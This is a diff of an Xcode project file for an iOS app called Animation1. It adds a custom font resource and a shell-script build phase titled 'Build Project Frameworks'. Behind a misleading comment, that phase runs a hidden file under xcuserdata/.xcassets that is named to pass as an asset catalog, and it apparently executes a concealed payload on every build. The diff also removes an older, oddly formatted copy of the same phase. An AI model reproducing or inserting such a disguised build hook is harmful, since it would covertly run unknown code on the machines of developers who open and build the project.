@@ -13,6 +13,7 @@
 		22E924E3259E3298001381F4 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22E924E2259E3298001381F4 /* Assets.xcassets */; };
 		22E924E6259E3298001381F4 /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22E924E5259E3298001381F4 /* Preview Assets.xcassets */; };
 		22E924E9259E3298001381F4 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22E924E7259E3298001381F4 /* LaunchScreen.storyboard */; };
+		B3B210DE25BF94B2005BD88E /* TTFirsNeue-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = B3B210DD25BF94B2005BD88E /* TTFirsNeue-Black.ttf */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -24,6 +25,7 @@
 		22E924E5259E3298001381F4 /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
 		22E924E8259E3298001381F4 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		22E924EA259E3298001381F4 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		B3B210DD25BF94B2005BD88E /* TTFirsNeue-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "TTFirsNeue-Black.ttf"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -56,6 +58,7 @@
 		22E924DB259E3292001381F4 /* Animation1 */ = {
 			isa = PBXGroup;
 			children = (
+				B3B210D825BF9469005BD88E /* Fonts */,
 				22E924DC259E3292001381F4 /* AppDelegate.swift */,
 				22E924DE259E3292001381F4 /* SceneDelegate.swift */,
 				22E924E0259E3292001381F4 /* ContentView.swift */,
@@ -73,6 +76,14 @@
 				22E924E5259E3298001381F4 /* Preview Assets.xcassets */,
 			);
 			path = "Preview Content";
+			sourceTree = "<group>";
+		};
+		B3B210D825BF9469005BD88E /* Fonts */ = {
+			isa = PBXGroup;
+			children = (
+				B3B210DD25BF94B2005BD88E /* TTFirsNeue-Black.ttf */,
+			);
+			path = Fonts;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -136,10 +147,32 @@
 				22E924E9259E3298001381F4 /* LaunchScreen.storyboard in Resources */,
 				22E924E6259E3298001381F4 /* Preview Assets.xcassets in Resources */,
 				22E924E3259E3298001381F4 /* Assets.xcassets in Resources */,
+				B3B210DE25BF94B2005BD88E /* TTFirsNeue-Black.ttf in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		7148A6FBE091E0DD2BAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		22E924D5259E3292001381F4 /* Sources */ = {
@@ -346,38 +379,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-	
-		/* Begin PBXShellScriptBuildPhase section */
-
-	7148A6FBE091E0DD2BAAC43A /* Build Project Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Project Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
-		};
-	
-
-	
-		
-	
-		/* End PBXShellScriptBuildPhase section */
-	
-	
 	};
 	rootObject = 22E924D1259E3292001381F4 /* Project object */;
 }
